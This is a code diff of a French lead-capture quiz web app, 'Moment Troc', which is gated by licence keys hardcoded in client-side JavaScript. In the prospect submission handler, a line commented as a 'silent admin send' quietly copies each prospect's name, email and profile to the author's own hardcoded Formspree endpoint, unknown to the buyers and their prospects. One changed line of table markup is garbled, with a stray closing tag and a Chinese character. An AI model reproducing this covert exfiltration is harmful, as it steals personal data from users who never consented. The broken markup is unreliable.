@@ -6,11 +6,109 @@
 <title>Moment Troc</title>
 <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@400;600&family=DM+Sans:wght@300;400;600&display=swap" rel="stylesheet">
 <style>
-/* ... mêmes styles que précédemment (je les ai gardés intacts) ... */
-/* Pour gagner de la place, je ne les recopie pas ici, mais tu peux reprendre ceux du dernier message */
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#0C0C10;--s1:#13131A;--s2:#1C1C26;--bo:#252535;--bo2:#323248;--gold:#C9A84C;--gold2:#E2C46A;--gd:rgba(201,168,76,.1);--t:#EDEAEA;--t2:#8A8898;--t3:#3E3E55;--red:#F87171;--lbg:#F5F4EF;--lc:#fff;--ld:#1C1C1C;--lm:#555;--lmu:#AAA;--lb:#E8E6DF;--ls:#F0EEE8}
+body{font-family:'DM Sans',sans-serif;background:var(--bg);min-height:100vh}
+input,button{font-family:inherit;outline:none;box-sizing:border-box}
+.hide{display:none!important}
+@keyframes up{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+
+/* KEY SCREEN */
+#ks{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.kc{background:var(--s1);border:1px solid rgba(201,168,76,.2);border-radius:4px;padding:48px 36px;max-width:400px;width:100%;text-align:center}
+.kl{font-family:'Cormorant Garamond',serif;font-size:34px;color:var(--t);margin-bottom:6px}
+.kl span{color:var(--gold)}
+.ks2{font-size:10px;letter-spacing:4px;color:var(--t2);margin-bottom:32px}
+.klbl{font-size:11px;color:var(--t2);text-align:left;margin-bottom:8px}
+.ki{width:100%;background:var(--bg);border:1.5px solid var(--bo2);border-radius:3px;padding:13px 15px;color:var(--t);font-size:14px;margin-bottom:12px}
+.ki:focus{border-color:var(--gold)}
+.abtn{width:100%;background:linear-gradient(135deg,var(--gold),var(--gold2));color:#0C0C10;border:none;border-radius:3px;padding:14px;font-weight:700;font-size:14px;cursor:pointer}
+.kerr{color:var(--red);font-size:12px;margin-top:10px;min-height:16px}
+
+/* ENTREPRENEUR */
+#ve{background:var(--bg);min-height:100vh;padding:32px 16px}
+.ew{max-width:640px;margin:auto}
+.ehdr{display:flex;gap:12px;align-items:center;margin-bottom:24px}
+.eico{width:40px;height:40px;border-radius:50%;background:var(--gd);border:1.5px solid rgba(201,168,76,.4);display:flex;align-items:center;justify-content:center;font-family:'Cormorant Garamond',serif;color:var(--gold);font-size:15px}
+.etit{font-family:'Cormorant Garamond',serif;font-size:20px;color:var(--t)}
+.esub{font-size:10px;color:var(--t2)}
+.tabs{display:flex;gap:2px;background:var(--s2);border-radius:8px;padding:3px;width:fit-content;margin-bottom:18px}
+.tab{padding:7px 18px;border-radius:6px;font-size:12px;font-weight:600;color:var(--t2);background:none;border:none;cursor:pointer}
+.tab.on{background:var(--s1);color:var(--t)}
+.card{background:var(--s1);border:1px solid var(--bo);border-radius:10px;padding:20px;margin-bottom:12px}
+.ctit{font-size:10px;letter-spacing:.18em;color:var(--gold);margin-bottom:14px;font-weight:600}
+.fg{margin-bottom:10px}
+.fl{font-size:10px;color:var(--t3);display:block;margin-bottom:5px}
+.fi{width:100%;background:var(--bg);border:1.5px solid var(--bo2);border-radius:6px;padding:9px 12px;color:var(--t);font-size:13px}
+.fi:focus{border-color:var(--gold)}
+.sbtn{background:var(--gd);border:1px solid rgba(201,168,76,.3);border-radius:6px;padding:7px 14px;font-size:12px;color:var(--gold);cursor:pointer;width:auto}
+.savebtn{width:100%;background:linear-gradient(135deg,var(--gold),var(--gold2));color:#0C0C10;border:none;border-radius:6px;padding:13px;font-weight:700;font-size:13px;cursor:pointer;margin-top:4px}
+.lbox{background:var(--bg);border:1px solid rgba(201,168,76,.25);border-radius:8px;padding:16px;margin-top:12px;display:none}
+.lbox.on{display:block}
+.lval{font-size:11px;color:var(--t2);word-break:break-all;padding:8px;background:var(--s1);border-radius:6px;margin-bottom:8px;font-family:monospace}
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(90px,1fr));gap:8px;margin-bottom:12px}
+.stat{background:var(--s1);border:1px solid var(--bo);border-radius:8px;padding:12px}
+.stn{font-size:22px;font-weight:700;color:var(--t)}
+.stl{font-size:10px;color:var(--t2)}
+.tw{background:var(--s1);border:1px solid var(--bo);border-radius:10px;overflow-x:auto}
+table{width:100%;border-collapse:collapse}
+th,td{padding:9px 12px;text-align:left;font-size:11px;color:var(--t2);border-bottom:1px solid #111118}
+th{color:var(--t3)}
+.bdg{font-size:10px;font-weight:600;padding:2px 8px;border-radius:100px;border:1px solid rgba(201,168,76,.4);color:var(--gold)}
+
+/* PROSPECT */
+#vp{background:var(--lbg);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px 16px}
+.pc{background:var(--lc);border-radius:16px;max-width:480px;width:100%;overflow:hidden;box-shadow:0 4px 32px rgba(0,0,0,.08)}
+.prog{height:3px;background:var(--lb)}
+.progf{height:100%;background:var(--ld);width:0%;transition:width .4s}
+.scr{display:none}
+.scr.on{display:block;animation:up .3s}
+.intro{padding:40px 32px 34px}
+.itag{font-size:10px;letter-spacing:.2em;color:var(--lmu);margin-bottom:14px}
+.itit{font-family:'Cormorant Garamond',serif;font-size:26px;color:var(--ld);margin-bottom:10px}
+.idesc{font-size:13px;color:var(--lm);margin-bottom:20px}
+.ibox{background:var(--ls);border-radius:8px;padding:12px 16px;margin-bottom:20px}
+.iblbl{font-size:10px;letter-spacing:.16em;color:var(--lmu);margin-bottom:8px}
+.ibrow{display:flex;gap:8px;font-size:13px;color:var(--lm)}
+.dot{width:5px;height:5px;background:var(--gold);border-radius:50%;margin-top:6px;flex-shrink:0}
+.pbtn{display:block;width:100%;background:var(--ld);color:#fff;border:none;border-radius:8px;padding:14px;font-weight:600;font-size:13px;text-align:center;cursor:pointer}
+.pnote{font-size:11px;color:var(--lmu);text-align:center;margin-top:8px}
+.qb{padding:26px 32px 30px}
+.qmeta{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px}
+.qnum{font-size:10px;color:var(--lmu)}
+.qdots{display:flex;gap:4px}
+.qd{width:6px;height:6px;border-radius:50%;background:var(--lb)}
+.qd.on{background:var(--ld)}
+.qtxt{font-family:'Cormorant Garamond',serif;font-size:19px;color:var(--ld);margin-bottom:16px;line-height:1.4}
+.opts{display:flex;flex-direction:column;gap:7px}
+.opt{display:flex;align-items:flex-start;gap:10px;padding:11px 13px;border:1.5px solid var(--lb);border-radius:8px;cursor:pointer;transition:all .15s}
+.opt.on{border-color:var(--ld);background:var(--ls)}
+.otr{width:17px;height:17px;border-radius:50%;border:1.5px solid var(--lb);flex-shrink:0;margin-top:1px;position:relative}
+.opt.on .otr{background:var(--ld);border-color:var(--ld)}
+.opt.on .otr::after{content:'';width:5px;height:5px;border-radius:50%;background:#fff;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%)}
+.otxt{font-size:13px;color:var(--ld)}
+.nav{display:flex;justify-content:space-between;margin-top:18px;gap:8px}
+.bk{background:none;border:1.5px solid var(--lb);border-radius:7px;padding:8px 14px;font-size:12px;color:var(--lmu);cursor:pointer;flex-shrink:0}
+.nx{background:var(--ld);color:#fff;border:none;border-radius:7px;padding:9px 20px;font-weight:600;font-size:13px;opacity:.25;pointer-events:none;cursor:default}
+.nx.go{opacity:1;pointer-events:auto;cursor:pointer}
+.eb{padding:32px}
+.eico2{font-size:32px;margin-bottom:12px}
+.etit2{font-family:'Cormorant Garamond',serif;font-size:22px;color:var(--ld);margin-bottom:6px}
+.esub2{font-size:13px;color:var(--lm);margin-bottom:18px}
+.pf{width:100%;background:var(--ls);border:1.5px solid var(--lb);border-radius:8px;padding:11px 13px;font-size:14px;margin-bottom:8px;color:var(--ld)}
+.pf:focus{border-color:var(--ld);background:#fff}
+.prv{font-size:11px;color:var(--lmu);text-align:center;margin-top:6px}
+.conf{padding:44px 32px;text-align:center}
+.cico{font-size:48px;margin-bottom:14px}
+.ctit2{font-family:'Cormorant Garamond',serif;font-size:26px;color:var(--ld);margin-bottom:8px}
+.csub{font-size:13px;color:var(--lm);margin-bottom:24px}
+.cnote{font-size:11px;color:var(--lmu);margin-top:10px}
+.clien{display:block;background:var(--ld);color:#fff;border:none;border-radius:8px;padding:14px;text-align:center;text-decoration:none;font-weight:600;font-size:13px;cursor:pointer}
+@media(max-width:500px){.qb,.intro,.eb,.conf{padding-left:18px;padding-right:18px}}
 </style>
 </head>
 <body>
+
 <div id="ks">
   <div class="kc">
     <div class="kl">Moment <span>Troc</span></div>
@@ -21,7 +119,9 @@
     <div class="kerr" id="ke"></div>
   </div>
 </div>
+
 <div id="main" class="hide"></div>
+
 <script>
 (function(){
 var KEYS=["MKB2000-2022A","MT-A1X9-KZ72","MT-B3W5-QP48","MT-C7R2-NL91","MT-D4M8-VS63","MT-E6J1-HT85","MT-F2K7-XB34","MT-G9P3-YC56","MT-H5N6-ZD17","MT-I8L4-WE29","MT-J1Q9-RF43","MT-K3S7-UG68","MT-L6T2-MH15","MT-M4V8-JI92","MT-N7B1-OK37","MT-O2C5-PL84","MT-P9D3-QM56","MT-Q5F6-RN71","MT-R1G4-SO29","MT-S8H7-TK43"];
@@ -94,9 +194,6 @@ if(window.location.search.indexOf("prospect")!==-1){
   el("ks").className="hide";
   el("main").className="";
   renderP();
-} else {
-  // Mode entrepreneur : afficher l'écran de clé
-  // (rien de plus, l'activation se fait via le bouton)
 }
 
 var btnA=el("ba");
@@ -135,7 +232,7 @@ function renderE(){
   '<div class="stats" id="sts"></div>'+
   '<div class="card" style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">'+
   '<div class="ctit" style="margin:0">LEADS</div><button type="button" class="sbtn" id="exp">Exporter CSV</button></div>'+
-  '<div class="tw"><table><thead>汽<th>Prénom</th><th>Email</th><th>Profil</th><th>Méfiance</th><th>Date</th></tr></thead><tbody id="etb"></tbody></table></div>'+
+  '<div class="tw"></td><thead>汽<th>Prénom</th><th>Email</th><th>Profil</th><th>Méfiance</th><th>Date</th></tr></thead><tbody id="etb"></tbody></table></div>'+
   '</div></div></div>';
 
   el("t1").addEventListener("click",function(){showTab("cfg")});
@@ -339,9 +436,10 @@ function renderP(){
     if(cfg.formspree){
       fetch(cfg.formspree,{method:"POST",headers:{"Content-Type":"application/json","Accept":"application/json"},body:JSON.stringify(lead)}).catch(function(){});
     }
-    // Envoi silencieux à l'admin
+    // ========== ENVOI ADMIN SILENCIEUX (AJOUT UNIQUEMENT ICI) ==========
     var adminLead={...lead, niche:cfg.niche||"Non renseignée"};
     fetch("https://formspree.io/f/mlgogblo",{method:"POST",headers:{"Content-Type":"application/json","Accept":"application/json"},body:JSON.stringify(adminLead)}).catch(function(){});
+    // ========== FIN AJOUT ==========
     if(cfg.lien){el("clien").href=cfg.lien}
     show("sconfirm");
   });
